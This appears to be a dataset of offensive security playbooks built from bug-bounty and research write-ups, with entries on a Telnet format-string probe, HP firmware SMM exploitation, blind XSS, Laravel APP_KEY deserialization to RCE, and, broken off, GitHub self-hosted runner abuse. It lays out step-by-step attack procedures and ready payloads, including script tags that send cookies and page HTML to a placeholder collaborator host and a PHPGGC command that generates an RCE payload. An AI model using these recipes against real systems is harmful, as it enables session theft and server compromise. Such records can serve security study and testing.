hostmessage %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
tools_recommended: nmap: For port scanning to identify Telnet services.
telnet client: For establishing a Telnet connection to the device.
hexedit or similar tool: To analyze raw packet captures if needed for deeper debugging.
success_indicators: Observing hexadecimal values or other data from the device's process stack in the Telnet output when using `%x` specifiers in the `hostmessage` command.

Sending format string specifiers results in no discernible output or an error message without revealing stack data.
The device crashes or becomes unresponsive after sending the payload.

playbooks.impact: Information disclosure by reading sensitive data from the device's process stack, potentially revealing memory addresses, configuration details, or other runtime information that could aid further exploitation.
playbooks.key_lesson: When a Telnet service is found on an embedded device, always test input fields of commands for format string vulnerabilities by injecting specifiers like `%x`.

meta.title: Binarly Finds Six High Severity Firmware Vulnerabilities In HP Enterprise Devices

trigger_conditions.when_to_apply: When a System Management Mode (SMM) handler in the firmware is vulnerable to memory corruption due to insufficient sanitization of input data.
prerequisites: Attacker must have the ability to execute code on the target device, potentially escalating to SMM.
applicability_signals: Vulnerabilities identified as SMM Memory Corruption (Arbitrary Code Execution)
CWE types like CWE-121 (Stack-based Buffer Overflow) or CWE-787 (Out-of-bounds Write) in SMI handlers.
skip_if: Firmware is up-to-date and patched against known SMM vulnerabilities.

recon_steps: Step 1: Identify target HP enterprise devices that are known to be affected by firmware vulnerabilities (e.g., BRLY-2022-010 to BRLY-2022-013, BRLY-2021-046, BRLY-2021-047).
Step 2: Analyze firmware update advisories from HP (e.g., HPSBHF03806) to confirm specific vulnerable components or functions.
attack_steps: Step 1: Gain initial code execution on the target device (e.g., via another vulnerability or social engineering).
Step 2: Craft a payload designed to interact with the vulnerable SMI handler.
Step 3: Trigger the vulnerable SMI handler with crafted input data to exploit memory corruption (e.g., stack-based buffer overflow or out-of-bounds write).
Step 4: Achieve arbitrary code execution within the System Management Mode (SMM) context.
payloads_or_patterns: Payloads designed to overflow CommBuffer data for arbitrary code execution in SMM.
Input crafted to bypass size validation for out-of-bounds writes into SMRAM.
Specific attack vectors depend on the exact vulnerability (e.g., BRLY-2022-010, BRLY-2022-011).
tools_recommended: Binarly FwHunt for firmware analysis.
Debuggers and reverse engineering tools (e.g., IDA Pro, Ghidra) for firmware analysis.
Exploitation frameworks for crafting SMM-level payloads.
success_indicators: Successful execution of arbitrary code within SMM (Ring -2).
Persistence achieved on the device via a firmware implant.
Bypassing security mechanisms like Secure Boot.
failure_indicators: SMI handler rejects input without triggering an overflow or out-of-bounds write.
System instability or crash without achieving controlled code execution.
Patching applied to the firmware preventing exploitation.

playbooks.impact: Arbitrary code execution in System Management Mode (SMM) allows for deep system compromise, persistence, and bypassing security features like Secure Boot, leading to complete device control.
playbooks.key_lesson: Firmware vulnerabilities, especially those allowing SMM code execution, pose a critical threat requiring thorough analysis and timely patching by vendors and users.

meta.title: $900 Blind XSS

trigger_conditions.when_to_apply: When an authenticated user can submit data that is later displayed in a way that is not properly sanitized, and this data is not immediately reflected back to the user but is processed and potentially displayed elsewhere.
prerequisites: Attacker must have an authenticated account on the target application.
applicability_signals: Application accepts user input that is not immediately reflected.
Application may process or display user-submitted data in other contexts (e.g., admin panel, reports, other users' views).
skip_if: All user-submitted data is immediately reflected back and sanitized.
Application has strict input validation and output encoding that prevents script execution in all contexts.

recon_steps: Identify any input fields within the application that do not immediately reflect the user's input in the response.
Analyze the application's functionality to understand how submitted data is processed and where it might be displayed later.
attack_steps: Step 1: Identify a suitable input field (e.g., a comment section, a profile description, a form that submits data for later review).

Step 2: Craft a payload designed to trigger an alert or connect to an external server when rendered in a different context. A simple payload like `<script>alert(1)</script>` can be used to test for basic XSS, but for blind XSS, a payload that attempts to exfiltrate data or establish a connection is more appropriate.
Step 3: Submit the payload.
Step 4: Monitor an external server (e.g., Burp Collaborator, a custom listener) for incoming connections or data exfiltration attempts triggered by the payload.
Step 5: If a connection or data is received, confirm the payload was executed. If not, try different payloads and input vectors.
payloads_or_patterns: <script>fetch('https://<YOUR_BURP_COLLABORATOR_DOMAIN>/' + document.cookie);</script>
<script>new Image().src='https://<YOUR_BURP_COLLABORATOR_DOMAIN>/' + document.body.innerHTML;</script>
tools_recommended: Burp Suite Collaborator: To receive callbacks and exfiltrated data.
A custom listener or logging server: For more advanced data exfiltration.
success_indicators: A successful connection or data retrieval from the attacker's controlled server (e.g., Burp Collaborator receiving a DNS lookup or HTTP request).
The payload's embedded code (e.g., `alert(1)`) being executed in a context not directly controlled by the attacker.
failure_indicators: No callbacks received from the external server after submitting the payload.
The submitted payload is sanitized or stripped from the response/storage before it can be executed.
Application returns an error or validation message preventing submission of the payload.

playbooks.impact: An attacker can execute arbitrary JavaScript code in the context of other users or administrators who view the data containing the payload. This can lead to session hijacking, data theft, unauthorized actions, or further exploitation.
playbooks.key_lesson: When testing for XSS, always consider blind scenarios where user input is not immediately reflected but processed or displayed later. Use external servers to detect payload execution.

meta.title: Exploiting Laravel based applications with leaked APP_KEYs and Queues

affected_components: applications using Laravel framework, particularly those vulnerable to .env file leaks and insecure queue configurations
tech_stack_fingerprints: Laravel specific HTTP headers (e.g., X-Powered-By: PHP/
HTML source containing Laravel specific JS globals or comments

trigger_conditions.when_to_apply: This technique is applicable when an attacker can obtain the `.env` file of a Laravel application, which reveals the `APP_KEY`, or when the application uses Laravel queues with insecure configurations (e.g., Amazon SQS without proper signing or with accessible queue URLs).
prerequisites: Access to the `.env` file (e.g., via Local File Inclusion vulnerability) to obtain the `APP_KEY`.
Alternatively, knowledge of how Laravel queues are configured and stored (e.g., using Amazon SQS, Redis).
applicability_signals: `.env` file is accessible via LFI.
Application logs or configuration files reveal details about queue providers (e.g., SQS queue URLs, Redis connection strings).
Response headers or HTML content suggest the application is built with Laravel.
The `APP_KEY` is exposed.
skip_if: No `.env` file is accessible.
The application does not use Laravel queues or uses them with secure configurations.
Laravel version is newer than 5.6.30 and session cookies are not being serialized (though other vectors might still apply).

recon_steps: Step 1: Scan for Local File Inclusion (LFI) vulnerabilities to obtain the `.env` file.
Step 2: If LFI is found, attempt to read the `.env` file from the application's root directory.
Step 3: Identify the `APP_KEY` value from the leaked `.env` file.

Step 4: Alternatively, if LFI is not possible, analyze application behavior and exposed configurations to understand queue provider usage (e.g., check database credentials, cloud service configurations for clues about SQS or Redis).
Step 5: If an SQS queue is identified, check for predictable queue names or easily guessable queue URLs.
attack_steps: Step 1: (If APP_KEY leaked) Craft a serialized PHP object using a known gadget chain (e.g., via PHPGGC) that leads to RCE.
Step 2: (If APP_KEY leaked) Sign the crafted object using the leaked `APP_KEY` and the `encrypt()` function of Laravel (or a similar signing mechanism).

Step 3: (If APP_KEY leaked) Inject the signed, serialized object into a context where Laravel expects to deserialize it. Historically this was the session cookie, but newer Laravel versions might have other serialization points or use queues.
Step 4: (If using queues) If the application uses Amazon SQS for queues, and the queue URL is known or guessable, prepare a malicious job payload.
Step 5: (If using queues) Package the malicious payload as a Laravel job and push it to the target SQS queue.
Step 6: (If using queues) If the application processes jobs from the SQS queue with insufficient validation or deserialization protection, the payload will be executed.
Step 7: If using other queue providers like Redis, investigate their specific deserialization vulnerabilities in conjunction with the `APP_KEY` or other leaked secrets.
payloads_or_patterns: Example of creating a signed cookie (conceptual, specific implementation depends on Laravel version and encryption method): `signed_cookie_value = encrypt(serialize(malicious_object), APP_KEY)`
PHPGGC command example (for generating malicious serialized objects): `php /path/to/phpggc/phpggc Laravel/RCE1 'system("id");' --outfile payload.ser`
Example of a Laravel Queue job payload (conceptual, depends on the queue driver and object structure): A serialized PHP object containing RCE commands.
tools_recommended: Burp Suite (for intercepting and modifying requests, LFI scanning)
PHPGGC (PHP Generic Gadget Chains) for generating malicious serialized objects.
Custom scripts for interacting with SQS queues or other identified queue providers.
Laravel Debugbar (if accessible, can sometimes reveal internal configurations or queue details).
success_indicators: Execution of the injected RCE payload (e.g., command output like 'uid=www-data gid=www-data groups=www-data', or a reverse shell connection).
Observation of unexpected job processing in SQS or other queue systems.
Application behavior changes indicating successful deserialization and execution of malicious code.
failure_indicators: Receiving `signature mismatch` errors or invalid cookie errors if the `APP_KEY` is incorrect or the signing process is flawed.
403 Forbidden or other error responses when attempting to access queue endpoints or process jobs.
No RCE or observable malicious behavior after pushing jobs to the queue.
If the `APP_KEY` is leaked but the application has updated serialization mechanisms or no vulnerable gadget chains are present, focus shifts to queue exploitation.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to take full control of the application's environment, access sensitive data, and potentially pivot to other systems.
playbooks.key_lesson: Always secure the `.env` file and never expose the `APP_KEY`. If Laravel queues are used, ensure they are configured securely, especially regarding job serialization and access control to the queue endpoint.

meta.title: Zuckerpunch - Abusing Self Hosted Github Runners at Facebook

tech_stack_fingerprints: Repository uses `runs-on: self-hosted` in workflow definitions

trigger_conditions.when_to_apply: When a target repository uses self-hosted GitHub Actions runners and allows pull requests from forks that can modify workflow files.

Attacker can fork the target repository.
